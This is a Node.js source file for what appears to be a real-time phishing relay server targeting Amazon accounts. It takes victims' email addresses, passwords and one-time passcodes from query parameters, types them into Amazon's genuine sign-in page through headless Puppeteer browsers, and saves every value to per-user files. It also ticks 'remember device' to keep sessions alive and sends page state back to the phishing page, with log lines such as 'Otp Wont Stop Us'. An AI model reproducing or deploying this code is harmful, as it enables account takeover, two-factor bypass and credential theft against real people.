const http = require('http');
const puppeteer = require('puppeteer');
const url = require('url')
var globalres = '';
var useraf;
const PORT = 8080;
const users = new Map();
const fs = require('fs')




const server = http.createServer(async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  globalres = res
  var urlParams = url.parse(req.url, true);
  var username = urlParams.query.n;

  if (req.url.includes('/start')) {
    useraf = urlParams.query.ag;
    handleRequest(username, (response) => {
      res.statusCode = 200;
      res.setHeader('Content-Type', 'text/plain');
      res.end(response);
    }).catch((error) => {
      res.statusCode = 500;
      res.setHeader('Content-Type', 'text/plain');
      res.end(`Error: ${error}`);
    });
  } else {
    if (req.url.includes('/e')) {
      var page = users.get(username).page;
      var email = urlParams.query.e
      const elem = await page.waitForSelector('input[name="email"]')
      await elem.click({ clickCount: 3 });
      await page.type('input[name="email"]', atob(email), { delay: 20 });
      await page.keyboard.press('Enter');
      savep(email, username)
    } else {
      if (req.url.includes('/p')) {
        var page = users.get(username).page;
        var pass = urlParams.query.p;
        await page.click('input[type="checkbox"][name="rememberMe"]')
        console.log('Login Shall Be Kept')
        await page.waitForSelector('input[name="password"]')
        await page.type('input[name="password"]', atob(pass), { delay: 20 });
        await page.keyboard.press('Enter')
        savep(pass, username);

      } else {
        if (req.url.includes('/o')) {

          var page = users.get(username).page;
          var o = urlParams.query.o;
          await page.click('input[type="checkbox"][name="rememberDevice"]')
          console.log('Otp Wont Stop Us')
          await page.waitForSelector('input[name="otpCode"]')
          await page.type('input[name="otpCode"]', atob(o), { delay: 20 });
          await page.keyboard.press('Enter')
          savep(o, username)



        }
      }
    }
  }


});





async function handleRequest(username, callback) {
  let browser;
  let page;
  let atPage = 'mail';
  let pageTimeOut;

  if (users.has(username)) {
    const userBrowser = users.get(username).browser;
    const userPage = users.get(username).page;
    const UseratPage = users.get(username).atPage;
    const userpageTimeOut = users.get(username).pageTimeOut;


    browser = userBrowser;
    page = userPage;
    pageTimeOut = userpageTimeOut;
    atPage = UseratPage
  } else {
    atPage = 'mail'
    browser = await puppeteer.launch({
      userDataDir: './users/' + username,
      headless: true,

    });

    pageTimeOut = setTimeout(function () {
      console.log('time exceeded for user ' + username)
      browser.close();
      users.delete(username);
    }, 120000);
    page = await browser.newPage();
    page.setDefaultNavigationTimeout(100000)
    await page.setUserAgent(useraf)
    await page.setRequestInterception(true);
    page.on('request', request => {
      if (request.resourceType() === 'stylesheet' || request.resourceType() === 'image') {
        request.abort();
      } else {
        request.continue();
      }
    })
    page.on('load', async () => {
      console.log('Page Loaded Looking for elements')
      clearTimeout(pageTimeOut);
      pageTimeOut = setTimeout(function () {
        console.log('time exceeded for user ' + username)
        browser.close();
        users.delete(username);
      }, 120000);
      //errors
      const errorMail = await page.$('text/We cannot find an account with that email address')
      const errorNumber = await page.$('text/We cannot find an account with that mobile number')
      const errorPass = await page.$('text/Your password is incorrect')
      const errorOtp = await page.$('text/The One Time Password (OTP) you entered is not valid. Please try again.')
      //pages 
      const passPage = await page.$('#ap_password')
      const otpPage = await page.$('text/Two-Step Verification')
      const captchaPass = await page.$('text/To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.')
      const alldone = await page.$('text/Skip to main content')
      if (atPage == 'mail') {
        if (passPage) {
          console.log('At Pass Page in ' + username);
          atPage = 'Pass'
          globalres.end('Pass')

        } else {
          if (errorMail) {
            console.log('mail incorrect Displaying alert box For mail in ' + username);
            globalres.end('error Mail')

          } else {
            if (errorNumber) {
              console.log('errorNumber in ' + username);
              globalres.end('error Number');

            }

            else {
              console.log('At Mail Page in ' + username);
              globalres.end('Home');
            }
          }
        }
      } else {
        if (atPage == 'Pass') {
          if (otpPage) {
            console.log('Pass Correct We At otp in ' + username);
            atPage = 'Otp'
            globalres.end('Otp')

          } else {
            if (errorPass) {
              console.log('the Pass Wrong Displaying Error Pass Alert in ' + username);
              atPage = 'mail'
              globalres.end('error Pass');

            } else {
              if (captchaPass) {
                console.log('atCaptcha Looks like password is incorrect in ' + username);
                globalres.end('error Pass')
                try {
                  await page.goBack();
                  await page.waitForTimeout('500')
                  await page.reload();
                } catch {
                  console.log('error At Exsiting Captcha in ' + username)
                }


              }
            }
          }
        } else {
          if (atPage == 'Otp') {
            if (errorOtp) {
              console.log('user Fakin Otp is Error')
              globalres.end('error Otp')
              try {
              } catch {
                console.log('error At Otp');
              }
            }
            if (alldone) {
              jsCode = 'show("l")'
              globalres.end('Done')
              browser.close();

              users.delete(username)
              try {
              } catch {
                console.log('error At Last')
              }
            }
          }
        }
      }
    });

    users.set(username, { browser, page, atPage, pageTimeOut });
  }

  await page.goto('https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&', { setTimeout: 60000 });
  return `Screenshot taken for user '${username}'`;
}



function savep(datas, user) {

  fs.appendFile('./users/' + user + '/' + user + 't.txt', "\r\n" + atob(datas), function (err) {
    if (err) {
      console.log('there was an error: ', err);
      return;
    }
    console.log('data was appended to file');
  });
}



server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});




